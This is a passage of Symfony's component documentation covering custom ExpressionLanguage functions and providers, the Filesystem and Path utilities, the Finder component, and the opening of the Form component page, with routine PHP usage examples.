instance, in the Symfony Framework, the security has custom functions to check
the user's role.

.. note::

    If you want to learn how to use functions in an expression, read
    ":ref:`component-expression-functions`".

Registering Functions
~~~~~~~~~~~~~~~~~~~~~

Functions are registered on each specific ``ExpressionLanguage`` instance.
That means the functions can be used in any expression executed by that
instance.

To register a function, use
:method:`Symfony\\Component\\ExpressionLanguage\\ExpressionLanguage::register`.
This method has 3 arguments:

* **name** - The name of the function in an expression;
* **compiler** - A function executed when compiling an expression using the
  function;
* **evaluator** - A function executed when the expression is evaluated.

Example::

    use Symfony\Component\ExpressionLanguage\ExpressionLanguage;

    $expressionLanguage = new ExpressionLanguage();
    $expressionLanguage->register('lowercase', function ($str): string {
        return sprintf('(is_string(%1$s) ? strtolower(%1$s) : %1$s)', $str);
    }, function ($arguments, $str): string {
        if (!is_string($str)) {
            return $str;
        }

        return strtolower($str);
    });

    var_dump($expressionLanguage->evaluate('lowercase("HELLO")'));
    // this will print: hello

In addition to the custom function arguments, the **evaluator** is passed an
``arguments`` variable as its first argument, which is equal to the second
argument of ``evaluate()`` (e.g. the "values" when evaluating an expression).

.. _components-expression-language-provider:

Using Expression Providers
~~~~~~~~~~~~~~~~~~~~~~~~~~

When you use the ``ExpressionLanguage`` class in your library, you often want
to add custom functions. To do so, you can create a new expression provider by
creating a class that implements
:class:`Symfony\\Component\\ExpressionLanguage\\ExpressionFunctionProviderInterface`.

This interface requires one method:
:method:`Symfony\\Component\\ExpressionLanguage\\ExpressionFunctionProviderInterface::getFunctions`,
which returns an array of expression functions (instances of
:class:`Symfony\\Component\\ExpressionLanguage\\ExpressionFunction`) to
register::

    use Symfony\Component\ExpressionLanguage\ExpressionFunction;
    use Symfony\Component\ExpressionLanguage\ExpressionFunctionProviderInterface;

    class StringExpressionLanguageProvider implements ExpressionFunctionProviderInterface
    {
        public function getFunctions(): array
        {
            return [
                new ExpressionFunction('lowercase', function ($str): string {
                    return sprintf('(is_string(%1$s) ? strtolower(%1$s) : %1$s)', $str);
                }, function ($arguments, $str): string {
                    if (!is_string($str)) {
                        return $str;
                    }

                    return strtolower($str);
                }),
            ];
        }
    }

.. tip::

    To create an expression function from a PHP function with the
    :method:`Symfony\\Component\\ExpressionLanguage\\ExpressionFunction::fromPhp` static method::

        ExpressionFunction::fromPhp('strtoupper');

    Namespaced functions are supported, but they require a second argument to
    define the name of the expression::

        ExpressionFunction::fromPhp('My\strtoupper', 'my_strtoupper');

You can register providers using
:method:`Symfony\\Component\\ExpressionLanguage\\ExpressionLanguage::registerProvider`
or by using the second argument of the constructor::

    use Symfony\Component\ExpressionLanguage\ExpressionLanguage;

    // using the constructor
    $expressionLanguage = new ExpressionLanguage(null, [
        new StringExpressionLanguageProvider(),
        // ...
    ]);

    // using registerProvider()
    $expressionLanguage->registerProvider(new StringExpressionLanguageProvider());

.. tip::

    It is recommended to create your own ``ExpressionLanguage`` class in your
    library. Now you can add the extension by overriding the constructor::

        use Psr\Cache\CacheItemPoolInterface;
        use Symfony\Component\ExpressionLanguage\ExpressionLanguage as BaseExpressionLanguage;

        class ExpressionLanguage extends BaseExpressionLanguage
        {
            public function __construct(?CacheItemPoolInterface $cache = null, array $providers = [])
            {
                // prepends the default provider to let users override it
                array_unshift($providers, new StringExpressionLanguageProvider());

                parent::__construct($cache, $providers);
            }
        }

.. _`AST`: https://en.wikipedia.org/wiki/Abstract_syntax_tree
.. _`CacheItemPoolInterface`: https://github.com/php-fig/cache/blob/master/src/CacheItemPoolInterface.php
The Filesystem Component
========================

    The Filesystem component provides platform-independent utilities for
    filesystem operations and for file/directory paths manipulation.

Installation
------------

.. code-block:: terminal

    $ composer require symfony/filesystem

.. include:: /components/require_autoload.rst.inc

Usage
-----

The component contains two main classes called :class:`Symfony\\Component\\Filesystem\\Filesystem`
and :class:`Symfony\\Component\\Filesystem\\Path`::

    use Symfony\Component\Filesystem\Exception\IOExceptionInterface;
    use Symfony\Component\Filesystem\Filesystem;
    use Symfony\Component\Filesystem\Path;

    $filesystem = new Filesystem();

    try {
        $filesystem->mkdir(
            Path::normalize(sys_get_temp_dir().'/'.random_int(0, 1000)),
        );
    } catch (IOExceptionInterface $exception) {
        echo "An error occurred while creating your directory at ".$exception->getPath();
    }

Filesystem Utilities
--------------------

``mkdir``
~~~~~~~~~

:method:`Symfony\\Component\\Filesystem\\Filesystem::mkdir` creates a directory recursively.
On POSIX filesystems, directories are created with a default mode value
``0777``. You can use the second argument to set your own mode::

    $filesystem->mkdir('/tmp/photos', 0700);

.. note::

    You can pass an array or any :phpclass:`Traversable` object as the first
    argument.

.. note::

    This function ignores already existing directories.

.. note::

    The directory permissions are affected by the current `umask`_.
    Set the ``umask`` for your webserver, use PHP's :phpfunction:`umask`
    function or use the :phpfunction:`chmod` function after the
    directory has been created.

``exists``
~~~~~~~~~~

:method:`Symfony\\Component\\Filesystem\\Filesystem::exists` checks for the
presence of one or more files or directories and returns ``false`` if any of
them is missing::

    // if this absolute directory exists, returns true
    $filesystem->exists('/tmp/photos');

    // if rabbit.jpg exists and bottle.png does not exist, returns false
    // non-absolute paths are relative to the directory where the running PHP script is stored
    $filesystem->exists(['rabbit.jpg', 'bottle.png']);

.. note::

    You can pass an array or any :phpclass:`Traversable` object as the first
    argument.

``copy``
~~~~~~~~

:method:`Symfony\\Component\\Filesystem\\Filesystem::copy` makes a copy of a
single file (use :method:`Symfony\\Component\\Filesystem\\Filesystem::mirror` to
copy directories). If the target already exists, the file is copied only if the
source modification date is later than the target. This behavior can be overridden
by the third boolean argument::

    // works only if image-ICC has been modified after image.jpg
    $filesystem->copy('image-ICC.jpg', 'image.jpg');

    // image.jpg will be overridden
    $filesystem->copy('image-ICC.jpg', 'image.jpg', true);

``touch``
~~~~~~~~~

:method:`Symfony\\Component\\Filesystem\\Filesystem::touch` sets access and
modification time for a file. The current time is used by default. You can set
your own with the second argument. The third argument is the access time::

    // sets modification time to the current timestamp
    $filesystem->touch('file.txt');
    // sets modification time 10 seconds in the future
    $filesystem->touch('file.txt', time() + 10);
    // sets access time 10 seconds in the past
    $filesystem->touch('file.txt', time(), time() - 10);

.. note::

    You can pass an array or any :phpclass:`Traversable` object as the first
    argument.

``chown``
~~~~~~~~~

:method:`Symfony\\Component\\Filesystem\\Filesystem::chown` changes the owner of
a file. The third argument is a boolean recursive option::

    // sets the owner of the lolcat video to www-data
    $filesystem->chown('lolcat.mp4', 'www-data');
    // changes the owner of the video directory recursively
    $filesystem->chown('/video', 'www-data', true);

.. note::

    You can pass an array or any :phpclass:`Traversable` object as the first
    argument.

``chgrp``
~~~~~~~~~

:method:`Symfony\\Component\\Filesystem\\Filesystem::chgrp` changes the group of
a file. The third argument is a boolean recursive option::

    // sets the group of the lolcat video to nginx
    $filesystem->chgrp('lolcat.mp4', 'nginx');
    // changes the group of the video directory recursively
    $filesystem->chgrp('/video', 'nginx', true);

.. note::

    You can pass an array or any :phpclass:`Traversable` object as the first
    argument.

``chmod``
~~~~~~~~~

:method:`Symfony\\Component\\Filesystem\\Filesystem::chmod` changes the mode or
permissions of a file. The fourth argument is a boolean recursive option::

    // sets the mode of the video to 0600
    $filesystem->chmod('video.ogg', 0600);
    // changes the mode of the src directory recursively
    $filesystem->chmod('src', 0700, 0000, true);

.. note::

    You can pass an array or any :phpclass:`Traversable` object as the first
    argument.

``remove``
~~~~~~~~~~

:method:`Symfony\\Component\\Filesystem\\Filesystem::remove` deletes files,
directories and symlinks::

    $filesystem->remove(['symlink', '/path/to/directory', 'activity.log']);

.. note::

    You can pass an array or any :phpclass:`Traversable` object as the first
    argument.

``rename``
~~~~~~~~~~

:method:`Symfony\\Component\\Filesystem\\Filesystem::rename` changes the name
of a single file or directory::

    // renames a file
    $filesystem->rename('/tmp/processed_video.ogg', '/path/to/store/video_647.ogg');
    // renames a directory
    $filesystem->rename('/tmp/files', '/path/to/store/files');
    // if the target already exists, a third boolean argument is available to overwrite.
    $filesystem->rename('/tmp/processed_video2.ogg', '/path/to/store/video_647.ogg', true);

``symlink``
~~~~~~~~~~~

:method:`Symfony\\Component\\Filesystem\\Filesystem::symlink` creates a
symbolic link from the target to the destination. If the filesystem does not
support symbolic links, a third boolean argument is available::

    // creates a symbolic link
    $filesystem->symlink('/path/to/source', '/path/to/destination');
    // duplicates the source directory if the filesystem
    // does not support symbolic links
    $filesystem->symlink('/path/to/source', '/path/to/destination', true);

``readlink``
~~~~~~~~~~~~

:method:`Symfony\\Component\\Filesystem\\Filesystem::readlink` read links targets.

The :method:`Symfony\\Component\\Filesystem\\Filesystem::readlink` method
provided by the Filesystem component behaves in the same way on all operating
systems (unlike PHP's :phpfunction:`readlink` function)::

    // returns the next direct target of the link without considering the existence of the target
    $filesystem->readlink('/path/to/link');

    // returns its absolute fully resolved final version of the target (if there are nested links, they are resolved)
    $filesystem->readlink('/path/to/link', true);

Its behavior is the following:

* When ``$canonicalize`` is ``false``:

  * if ``$path`` does not exist or is not a link, it returns ``null``.
  * if ``$path`` is a link, it returns the next direct target of the link without considering the existence of the target.

* When ``$canonicalize`` is ``true``:

  * if ``$path`` does not exist, it returns null.
  * if ``$path`` exists, it returns its absolute fully resolved final version.

.. note::

    If you wish to canonicalize the path without checking its existence, you can
    use :method:`Symfony\\Component\\Filesystem\\Path::canonicalize` method instead.

``makePathRelative``
~~~~~~~~~~~~~~~~~~~~

:method:`Symfony\\Component\\Filesystem\\Filesystem::makePathRelative` takes two
absolute paths and returns the relative path from the second path to the first one::

    // returns '../'
    $filesystem->makePathRelative(
        '/var/lib/symfony/src/Symfony/',
        '/var/lib/symfony/src/Symfony/Component'
    );
    // returns 'videos/'
    $filesystem->makePathRelative('/tmp/videos', '/tmp');

``mirror``
~~~~~~~~~~

:method:`Symfony\\Component\\Filesystem\\Filesystem::mirror` copies all the
contents of the source directory into the target one (use the
:method:`Symfony\\Component\\Filesystem\\Filesystem::copy` method to copy single
files)::

    $filesystem->mirror('/path/to/source', '/path/to/target');

``isAbsolutePath``
~~~~~~~~~~~~~~~~~~

:method:`Symfony\\Component\\Filesystem\\Filesystem::isAbsolutePath` returns
``true`` if the given path is absolute, ``false`` otherwise::

    // returns true
    $filesystem->isAbsolutePath('/tmp');
    // returns true
    $filesystem->isAbsolutePath('c:\\Windows');
    // returns false
    $filesystem->isAbsolutePath('tmp');
    // returns false
    $filesystem->isAbsolutePath('../dir');

``tempnam``
~~~~~~~~~~~

:method:`Symfony\\Component\\Filesystem\\Filesystem::tempnam` creates a
temporary file with a unique filename, and returns its path, or throw an
exception on failure::

    // returns a path like : /tmp/prefix_wyjgtF
    $filesystem->tempnam('/tmp', 'prefix_');
    // returns a path like : /tmp/prefix_wyjgtF.png
    $filesystem->tempnam('/tmp', 'prefix_', '.png');

.. _filesystem-dumpfile:

``dumpFile``
~~~~~~~~~~~~

:method:`Symfony\\Component\\Filesystem\\Filesystem::dumpFile` saves the given
contents into a file (creating the file and its directory if they don't exist).
It does this in an atomic manner: it writes a temporary file first and then moves
it to the new file location when it's finished. This means that the user will
always see either the complete old file or complete new file (but never a
partially-written file)::

    $filesystem->dumpFile('file.txt', 'Hello World');

The ``file.txt`` file contains ``Hello World`` now.

``appendToFile``
~~~~~~~~~~~~~~~~

:method:`Symfony\\Component\\Filesystem\\Filesystem::appendToFile` adds new
contents at the end of some file::

    $filesystem->appendToFile('logs.txt', 'Email sent to user@example.com');
    // the third argument tells whether the file should be locked when writing to it
    $filesystem->appendToFile('logs.txt', 'Email sent to user@example.com', true);

If either the file or its containing directory doesn't exist, this method
creates them before appending the contents.

``readFile``
~~~~~~~~~~~~

.. versionadded:: 7.1

    The ``readFile()`` method was introduced in Symfony 7.1.

:method:`Symfony\\Component\\Filesystem\\Filesystem::readFile` returns all the
contents of a file as a string. Unlike the :phpfunction:`file_get_contents` function
from PHP, it throws an exception when the given file path is not readable and
when passing the path to a directory instead of a file::

    $contents = $filesystem->readFile('/some/path/to/file.txt');

The ``$contents`` variable now stores all the contents of the ``file.txt`` file.

Path Manipulation Utilities
---------------------------

Dealing with file paths usually involves some difficulties:

- Platform differences: file paths look different on different platforms. UNIX
  file paths start with a slash ("/"), while Windows file paths start with a
  system drive ("C:"). UNIX uses forward slashes, while Windows uses backslashes
  by default.
- Absolute/relative paths: web applications frequently need to deal with absolute
  and relative paths. Converting one to the other properly is tricky and repetitive.

:class:`Symfony\\Component\\Filesystem\\Path` provides utility methods to tackle
those issues.

Canonicalization
~~~~~~~~~~~~~~~~

Returns the shortest path name equivalent to the given path. It applies the
following rules iteratively until no further processing can be done:

- "." segments are removed;
- ".." segments are resolved;
- backslashes ("\\") are converted into forward slashes ("/");
- root paths ("/" and "C:/") always terminate with a slash;
- non-root paths never terminate with a slash;
- schemes (such as "phar://") are kept;
- replace ``~`` with the user's home directory.

You can canonicalize a path with :method:`Symfony\\Component\\Filesystem\\Path::canonicalize`::

    echo Path::canonicalize('/var/www/vhost/webmozart/../config.ini');
    // => /var/www/vhost/config.ini

You can pass absolute paths and relative paths to the
:method:`Symfony\\Component\\Filesystem\\Path::canonicalize` method. When a
relative path is passed, ".." segments at the beginning of the path are kept::

    echo Path::canonicalize('../uploads/../config/config.yaml');
    // => ../config/config.yaml

Malformed paths are returned unchanged::

    echo Path::canonicalize('C:Programs/PHP/php.ini');
    // => C:Programs/PHP/php.ini

Converting Absolute/Relative Paths
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Absolute/relative paths can be converted with the methods
:method:`Symfony\\Component\\Filesystem\\Path::makeAbsolute`
and :method:`Symfony\\Component\\Filesystem\\Path::makeRelative`.

:method:`Symfony\\Component\\Filesystem\\Path::makeAbsolute` method expects a
relative path and a base path to base that relative path upon::

    echo Path::makeAbsolute('config/config.yaml', '/var/www/project');
    // => /var/www/project/config/config.yaml

If an absolute path is passed in the first argument, the absolute path is
returned unchanged::

    echo Path::makeAbsolute('/usr/share/lib/config.ini', '/var/www/project');
    // => /usr/share/lib/config.ini

The method resolves ".." segments, if there are any::

    echo Path::makeAbsolute('../config/config.yaml', '/var/www/project/uploads');
    // => /var/www/project/config/config.yaml

This method is very useful if you want to be able to accept relative paths (for
example, relative to the root directory of your project) and absolute paths at
the same time.

:method:`Symfony\\Component\\Filesystem\\Path::makeRelative` is the inverse
operation to :method:`Symfony\\Component\\Filesystem\\Path::makeAbsolute`::

    echo Path::makeRelative('/var/www/project/config/config.yaml', '/var/www/project');
    // => config/config.yaml

If the path is not within the base path, the method will prepend ".." segments
as necessary::

    echo Path::makeRelative('/var/www/project/config/config.yaml', '/var/www/project/uploads');
    // => ../config/config.yaml

Use :method:`Symfony\\Component\\Filesystem\\Path::isAbsolute` and
:method:`Symfony\\Component\\Filesystem\\Path::isRelative` to check whether a
path is absolute or relative::

    Path::isAbsolute('C:\Programs\PHP\php.ini')
    // => true

All four methods internally canonicalize the passed path.

Finding Longest Common Base Paths
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

When you store absolute file paths on the file system, this leads to a lot of
duplicated information::

    return [
        '/var/www/vhosts/project/httpdocs/config/config.yaml',
        '/var/www/vhosts/project/httpdocs/config/routing.yaml',
        '/var/www/vhosts/project/httpdocs/config/services.yaml',
        '/var/www/vhosts/project/httpdocs/images/banana.gif',
        '/var/www/vhosts/project/httpdocs/uploads/images/nicer-banana.gif',
    ];

Especially when storing many paths, the amount of duplicated information is
noticeable. You can use :method:`Symfony\\Component\\Filesystem\\Path::getLongestCommonBasePath`
to check a list of paths for a common base path::

    $basePath = Path::getLongestCommonBasePath(
        '/var/www/vhosts/project/httpdocs/config/config.yaml',
        '/var/www/vhosts/project/httpdocs/config/routing.yaml',
        '/var/www/vhosts/project/httpdocs/config/services.yaml',
        '/var/www/vhosts/project/httpdocs/images/banana.gif',
        '/var/www/vhosts/project/httpdocs/uploads/images/nicer-banana.gif'
    );
    // => /var/www/vhosts/project/httpdocs

Use this common base path to shorten the stored paths::

    return [
        $basePath.'/config/config.yaml',
        $basePath.'/config/routing.yaml',
        $basePath.'/config/services.yaml',
        $basePath.'/images/banana.gif',
        $basePath.'/uploads/images/nicer-banana.gif',
    ];

:method:`Symfony\\Component\\Filesystem\\Path::getLongestCommonBasePath` always
returns canonical paths.

Use :method:`Symfony\\Component\\Filesystem\\Path::isBasePath` to test whether a
path is a base path of another path::

    Path::isBasePath("/var/www", "/var/www/project");
    // => true

    Path::isBasePath("/var/www", "/var/www/project/..");
    // => true

    Path::isBasePath("/var/www", "/var/www/project/../..");
    // => false

Finding Directories/Root Directories
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

PHP offers the function :phpfunction:`dirname` to obtain the directory path of a
file path. This method has a few quirks::

- ``dirname()`` does not accept backslashes on UNIX
- ``dirname("C:/Programs")`` returns "C:", not "C:/"
- ``dirname("C:/")`` returns ".", not "C:/"
- ``dirname("C:")`` returns ".", not "C:/"
- ``dirname("Programs")`` returns ".", not ""
- ``dirname()`` does not canonicalize the result

:method:`Symfony\\Component\\Filesystem\\Path::getDirectory` fixes these
shortcomings::

    echo Path::getDirectory("C:\Programs");
    // => C:/

Additionally, you can use :method:`Symfony\\Component\\Filesystem\\Path::getRoot`
to obtain the root of a path::

    echo Path::getRoot("/etc/apache2/sites-available");
    // => /

    echo Path::getRoot("C:\Programs\Apache\Config");
    // => C:/

Error Handling
--------------

Whenever something wrong happens, an exception implementing
:class:`Symfony\\Component\\Filesystem\\Exception\\ExceptionInterface` or
:class:`Symfony\\Component\\Filesystem\\Exception\\IOExceptionInterface` is thrown.

.. note::

    An :class:`Symfony\\Component\\Filesystem\\Exception\\IOException` is
    thrown if directory creation fails.

.. _`umask`: https://en.wikipedia.org/wiki/Umask
The Finder Component
====================

    The Finder component finds files and directories based on different criteria
    (name, file size, modification time, etc.) via an intuitive fluent interface.

Installation
------------

.. code-block:: terminal

    $ composer require symfony/finder

.. include:: /components/require_autoload.rst.inc

Usage
-----

The :class:`Symfony\\Component\\Finder\\Finder` class finds files and/or
directories::

    use Symfony\Component\Finder\Finder;

    $finder = new Finder();
    // find all files in the current directory
    $finder->files()->in(__DIR__);

    // check if there are any search results
    if ($finder->hasResults()) {
        // ...
    }

    foreach ($finder as $file) {
        $absoluteFilePath = $file->getRealPath();
        $fileNameWithExtension = $file->getRelativePathname();

        // ...
    }

The ``$file`` variable is an instance of
:class:`Symfony\\Component\\Finder\\SplFileInfo` which extends PHP's own
:phpclass:`SplFileInfo` to provide methods to work with relative paths.

.. caution::

    The ``Finder`` object doesn't reset its internal state automatically.
    This means that you need to create a new instance if you do not want
    to get mixed results.

Searching for Files and Directories
-----------------------------------

The component provides lots of methods to define the search criteria. They all
can be chained because they implement a `fluent interface`_.

Location
~~~~~~~~

The location is the only mandatory criteria. It tells the finder which
directory to use for the search::

    $finder->in(__DIR__);

Search in several locations by chaining calls to
:method:`Symfony\\Component\\Finder\\Finder::in`::

    // search inside *both* directories
    $finder->in([__DIR__, '/elsewhere']);

    // same as above
    $finder->in(__DIR__)->in('/elsewhere');

Use ``*`` as a wildcard character to search in the directories matching a
pattern (each pattern has to resolve to at least one directory path)::

    $finder->in('src/Symfony/*/*/Resources');

Exclude directories from matching with the
:method:`Symfony\\Component\\Finder\\Finder::exclude` method::

    // directories passed as argument must be relative to the ones defined with the in() method
    $finder->in(__DIR__)->exclude('ruby');

It's also possible to ignore directories that you don't have permission to read::

    $finder->ignoreUnreadableDirs()->in(__DIR__);

As the Finder uses PHP iterators, you can pass any URL with a supported
`PHP wrapper for URL-style protocols`_ (``ftp://``, ``zlib://``, etc.)::

    // always add a trailing slash when looking for in the FTP root dir
    $finder->in('ftp://example.com/');

    // you can also look for in a FTP directory
    $finder->in('ftp://example.com/pub/');

And it also works with user-defined streams::

    use Symfony\Component\Finder\Finder;

    // register a 's3://' wrapper with the official AWS SDK
    $s3Client = new Aws\S3\S3Client([/* config options */]);
    $s3Client->registerStreamWrapper();

    $finder = new Finder();
    $finder->name('photos*')->size('< 100K')->date('since 1 hour ago');
    foreach ($finder->in('s3://bucket-name') as $file) {
        // ... do something with the file
    }

.. seealso::

    Read the `PHP streams`_ documentation to learn how to create your own streams.

Files or Directories
~~~~~~~~~~~~~~~~~~~~

By default, the Finder returns both files and directories. If you need to find either files or directories only, use the :method:`Symfony\\Component\\Finder\\Finder::files` and :method:`Symfony\\Component\\Finder\\Finder::directories` methods::

    // look for files only; ignore directories
    $finder->files();

    // look for directories only; ignore files
    $finder->directories();

If you want to follow `symbolic links`_, use the ``followLinks()`` method::

    $finder->files()->followLinks();

Version Control Files
~~~~~~~~~~~~~~~~~~~~~

`Version Control Systems`_ (or "VCS" for short), such as Git and Mercurial,
create some special files to store their metadata. Those files are ignored by
default when looking for files and directories, but you can change this with the
``ignoreVCS()`` method::

    $finder->ignoreVCS(false);

If the search directory and its subdirectories contain ``.gitignore`` files, you
can reuse those rules to exclude files and directories from the results with the
:method:`Symfony\\Component\\Finder\\Finder::ignoreVCSIgnored` method::

    // excludes files/directories matching the .gitignore patterns
    $finder->ignoreVCSIgnored(true);

The rules of a directory always override the rules of its parent directories.

.. note::

    Git looks for ``.gitignore`` files starting from the repository root directory.
    Symfony's Finder behavior is different and it looks for ``.gitignore`` files
    starting from the directory used to search files/directories. To be consistent
    with Git behavior, you should explicitly search from the Git repository root.

File Name
~~~~~~~~~

Find files by name with the
:method:`Symfony\\Component\\Finder\\Finder::name` method::

    $finder->files()->name('*.php');

The ``name()`` method accepts globs, strings, regexes or an array of globs,
strings or regexes::

    $finder->files()->name('/\.php$/');

Multiple filenames can be defined by chaining calls or passing an array::

    $finder->files()->name('*.php')->name('*.twig');

    // same as above
    $finder->files()->name(['*.php', '*.twig']);

The ``notName()`` method excludes files matching a pattern::

    $finder->files()->notName('*.rb');

Multiple filenames can be excluded by chaining calls or passing an array::

    $finder->files()->notName('*.rb')->notName('*.py');

    // same as above
    $finder->files()->notName(['*.rb', '*.py']);

File Contents
~~~~~~~~~~~~~

Find files by content with the
:method:`Symfony\\Component\\Finder\\Finder::contains` method::

    $finder->files()->contains('lorem ipsum');

The ``contains()`` method accepts strings or regexes::

    $finder->files()->contains('/lorem\s+ipsum$/i');

The ``notContains()`` method excludes files containing given pattern::

    $finder->files()->notContains('dolor sit amet');

Path
~~~~

Find files and directories by path with the
:method:`Symfony\\Component\\Finder\\Finder::path` method::

    // matches files that contain "data" anywhere in their paths (files or directories)
    $finder->path('data');
    // for example this will match data/*.xml and data.xml if they exist
    $finder->path('data')->name('*.xml');

Use the forward slash (i.e. ``/``) as the directory separator on all platforms,
including Windows. The component makes the necessary conversion internally.

The ``path()`` method accepts a string, a regular expression or an array of
strings or regular expressions::

    $finder->path('foo/bar');
    $finder->path('/^foo\/bar/');

Multiple paths can be defined by chaining calls or passing an array::

    $finder->path('data')->path('foo/bar');

    // same as above
    $finder->path(['data', 'foo/bar']);

Internally, strings are converted into regular expressions by escaping slashes
and adding delimiters:

=====================  =======================
Original Given String  Regular Expression Used
=====================  =======================
``dirname``            ``/dirname/``
``a/b/c``              ``/a\/b\/c/``
=====================  =======================

The :method:`Symfony\\Component\\Finder\\Finder::notPath` method excludes files
by path::

    $finder->notPath('other/dir');

Multiple paths can be excluded by chaining calls or passing an array::

    $finder->notPath('first/dir')->notPath('other/dir');

    // same as above
    $finder->notPath(['first/dir', 'other/dir']);

File Size
~~~~~~~~~

Find files by size with the
:method:`Symfony\\Component\\Finder\\Finder::size` method::

    $finder->files()->size('< 1.5K');

Restrict by a size range by chaining calls or passing an array::

    $finder->files()->size('>= 1K')->size('<= 2K');

    // same as above
    $finder->files()->size(['>= 1K', '<= 2K']);

The comparison operator can be any of the following: ``>``, ``>=``, ``<``,
``<=``, ``==``, ``!=``.

The target value may use magnitudes of kilobytes (``k``, ``ki``), megabytes
(``m``, ``mi``), or gigabytes (``g``, ``gi``). Those suffixed with an ``i`` use
the appropriate ``2**n`` version in accordance with the `IEC standard`_.

File Date
~~~~~~~~~

Find files by last modified dates with the
:method:`Symfony\\Component\\Finder\\Finder::date` method::

    $finder->date('since yesterday');

Restrict by a date range by chaining calls or passing an array::

    $finder->date('>= 2018-01-01')->date('<= 2018-12-31');

    // same as above
    $finder->date(['>= 2018-01-01', '<= 2018-12-31']);

The comparison operator can be any of the following: ``>``, ``>=``, ``<``,
``<=``, ``==``. You can also use ``since`` or ``after`` as an alias for ``>``,
and ``until`` or ``before`` as an alias for ``<``.

The target value can be any date supported by :phpfunction:`strtotime`.

Directory Depth
~~~~~~~~~~~~~~~

By default, the Finder recursively traverses directories. Restrict the depth of
traversing with :method:`Symfony\\Component\\Finder\\Finder::depth`::

    // this will only consider files/directories which are direct children
    $finder->depth('== 0');
    $finder->depth('< 3');

Restrict by a depth range by chaining calls or passing an array::

    $finder->depth('> 2')->depth('< 5');

    // same as above
    $finder->depth(['> 2', '< 5']);

Custom Filtering
~~~~~~~~~~~~~~~~

To filter results with your own strategy, use
:method:`Symfony\\Component\\Finder\\Finder::filter`::

    $filter = function (\SplFileInfo $file)
    {
        if (strlen($file) > 10) {
            return false;
        }
    };

    $finder->files()->filter($filter);

The ``filter()`` method takes a Closure as an argument. For each matching file,
it is called with the file as a :class:`Symfony\\Component\\Finder\\SplFileInfo`
instance. The file is excluded from the result set if the Closure returns
``false``.

The ``filter()`` method includes a second optional argument to prune directories.
If set to ``true``, this method completely skips the excluded directories instead
of traversing the entire file/directory structure and excluding them later. When
using a closure, return ``false`` for the directories which you want to prune.

Pruning directories early can improve performance significantly depending on the
file/directory hierarchy complexity and the number of excluded directories.

Sorting Results
---------------

Sort the results by name, extension, size or type (directories first, then files)::

    $finder->sortByName();
    $finder->sortByCaseInsensitiveName();
    $finder->sortByExtension();
    $finder->sortBySize();
    $finder->sortByType();

.. tip::

    By default, the ``sortByName()`` method uses the :phpfunction:`strcmp` PHP
    function (e.g. ``file1.txt``, ``file10.txt``, ``file2.txt``). Pass ``true``
    as its argument to use PHP's `natural sort order`_ algorithm instead (e.g.
    ``file1.txt``, ``file2.txt``, ``file10.txt``).

    The ``sortByCaseInsensitiveName()`` method uses the case insensitive
    :phpfunction:`strcasecmp` PHP function. Pass ``true`` as its argument to use
    PHP's case insensitive `natural sort order`_ algorithm instead (i.e. the
    :phpfunction:`strnatcasecmp` PHP function)

Sort the files and directories by the last accessed, changed or modified time::

    $finder->sortByAccessedTime();

    $finder->sortByChangedTime();

    $finder->sortByModifiedTime();

You can also define your own sorting algorithm with the ``sort()`` method::

    $finder->sort(function (\SplFileInfo $a, \SplFileInfo $b): int {
        return strcmp($a->getRealPath(), $b->getRealPath());
    });

You can reverse any sorting by using the ``reverseSorting()`` method::

    // results will be sorted "Z to A" instead of the default "A to Z"
    $finder->sortByName()->reverseSorting();

.. note::

    Notice that the ``sort*`` methods need to get all matching elements to do
    their jobs. For large iterators, it is slow.

Transforming Results into Arrays
--------------------------------

A Finder instance is an :phpclass:`IteratorAggregate` PHP class. So, in addition
to iterating over the Finder results with ``foreach``, you can also convert it
to an array with the :phpfunction:`iterator_to_array` function, or get the
number of items with :phpfunction:`iterator_count`.

If you call to the :method:`Symfony\\Component\\Finder\\Finder::in` method more
than once to search through multiple locations, pass ``false`` as a second
parameter to :phpfunction:`iterator_to_array` to avoid issues (a separate
iterator is created for each location and, if you don't pass ``false`` to
:phpfunction:`iterator_to_array`, keys of result sets are used and some of them
might be duplicated and their values overwritten).

Reading Contents of Returned Files
----------------------------------

The contents of returned files can be read with
:method:`Symfony\\Component\\Finder\\SplFileInfo::getContents`::

    use Symfony\Component\Finder\Finder;

    $finder = new Finder();
    $finder->files()->in(__DIR__);

    foreach ($finder as $file) {
        $contents = $file->getContents();

        // ...
    }

.. _`fluent interface`: https://en.wikipedia.org/wiki/Fluent_interface
.. _`symbolic links`: https://en.wikipedia.org/wiki/Symbolic_link
.. _`Version Control Systems`: https://en.wikipedia.org/wiki/Version_control
.. _`PHP wrapper for URL-style protocols`: https://www.php.net/manual/en/wrappers.php
.. _`PHP streams`: https://www.php.net/streams
.. _`IEC standard`: https://physics.nist.gov/cuu/Units/binary.html
.. _`natural sort order`: https://en.wikipedia.org/wiki/Natural_sort_order
The Form Component
==================

    The Form component allows you to create, process and reuse forms.

The Form component is a tool to help you solve the problem of allowing end-users
to interact with the data and modify the data in your application. And though
traditionally this has been through HTML forms, the component focuses on
processing data to and from your client and application, whether that data
be from a normal form post or from an API.

Installation
------------

.. code-block:: terminal

    $ composer require symfony/form

.. include:: /components/require_autoload.rst.inc

Configuration
-------------

.. seealso::

    This article explains how to use the Form features as an independent
    component in any PHP application. Read the :doc:`/forms` article to learn
    about how to use it in Symfony applications.

In Symfony, forms are represented by objects and these objects are built
by using a *form factory*. Building a form factory is done with the factory
method ``Forms::createFormFactory``::

    use Symfony\Component\Form\Forms;

    $formFactory = Forms::createFormFactory();

This factory can already be used to create basic forms, but it is lacking
support for very important features:

* **Request Handling:** Support for request handling and file uploads;
* **CSRF Protection:** Support for protection against Cross-Site-Request-Forgery
  (CSRF) attacks;
* **Templating:** Integration with a templating layer that allows you to reuse
  HTML fragments when rendering a form;
* **Translation:** Support for translating error messages, field labels and
  other strings;
* **Validation:** Integration with a validation library to generate error
  messages for submitted data.

The Symfony Form component relies on other libraries to solve these problems.
Most of the time you will use Twig and the Symfony
:doc:`HttpFoundation </components/http_foundation>`,
:doc:`Translation </translation>` and :doc:`Validator </components/validator>`
components, but you can replace any of these with a different library of your choice.

The following sections explain how to plug these libraries into the form
factory.

.. tip::

    For a working example, see https://github.com/webmozart/standalone-forms

Request Handling
~~~~~~~~~~~~~~~~

To process form data, you'll need to call the :method:`Symfony\\Component\\Form\\Form::handleRequest`
method::

    $form->handleRequest();

Behind the scenes, this uses a :class:`Symfony\\Component\\Form\\NativeRequestHandler`
